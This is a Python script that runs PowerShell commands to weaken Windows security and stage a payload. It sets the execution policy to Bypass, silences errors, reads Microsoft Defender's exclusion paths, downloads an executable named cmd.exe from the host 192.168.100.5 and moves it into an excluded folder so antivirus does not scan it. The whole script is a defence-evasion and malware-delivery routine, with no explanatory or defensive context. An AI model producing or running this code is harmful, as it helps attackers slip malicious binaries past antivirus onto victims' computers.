import os
import subprocess
import tempfile

def run_powershell_command(command):
    """Run a PowerShell command"""
    subprocess.run(["powershell.exe", "-Command", command], shell=True, check=True)

def locate_exclusions_folder():
    """Locate the exclusions folder for Microsoft Defender"""
    command = 'Get-MpPreference | Select-Object -ExpandProperty ExclusionPath'
    output = subprocess.run(["powershell.exe", "-Command", command], capture_output=True, text=True, shell=True)
    return output.stdout.strip()

def main():
    # Command to change execution policy to Bypass for the local system
    execution_policy_command = 'Set-ExecutionPolicy Bypass -Scope LocalMachine -Force'

    try:
        # Run the PowerShell command to change execution policy silently
        run_powershell_command("$ErrorActionPreference = 'SilentlyContinue'; " + execution_policy_command)

        # Locate the exclusions folder for Microsoft Defender
        exclusions_folder = locate_exclusions_folder()

        if exclusions_folder:
            # Create a temporary directory to store the downloaded file
            temp_dir = tempfile.mkdtemp()

            # Download the cmd.exe file from 192.168.100.5
            download_command = f'Invoke-WebRequest -Uri http://192.168.100.5/cmd.exe -OutFile "{temp_dir}\\cmd.exe"'

            # Run the PowerShell command to download the file silently
            run_powershell_command("$ErrorActionPreference = 'SilentlyContinue'; " + download_command)

            # Move the downloaded file to the exclusions folder
            move_command = f'Move-Item -Path "{temp_dir}\\cmd.exe" -Destination "{exclusions_folder}\\cmd.exe" -Force'
            run_powershell_command("$ErrorActionPreference = 'SilentlyContinue'; " + move_command)

            print("cmd.exe file downloaded and placed in the exclusions folder successfully.")
        else:
            print("Unable to locate the exclusions folder for Microsoft Defender.")
    except subprocess.CalledProcessError as e:
        print("Error executing PowerShell command:", e)

if __name__ == "__main__":
    main()
